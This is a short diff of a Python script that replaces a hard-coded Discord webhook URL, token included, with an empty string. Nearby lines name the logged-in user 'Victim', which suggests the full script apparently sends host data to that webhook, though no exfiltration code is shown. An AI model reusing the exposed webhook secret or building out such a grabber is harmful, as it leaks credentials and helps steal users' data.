@@ -6,7 +6,7 @@ import urllib.request
 import datetime
 
 ping_me = True
-webhook_url = 'https://discord.com/api/webhooks/999924933712957450/xhQm7ml00G6UtSAO1MiJFMoLfW5iqb2-FZkobkp8n6_Fzct2QcUZHS22FWcHkw2WXiZF'
+webhook_url = ''
 Victim = os.getlogin()
 
 
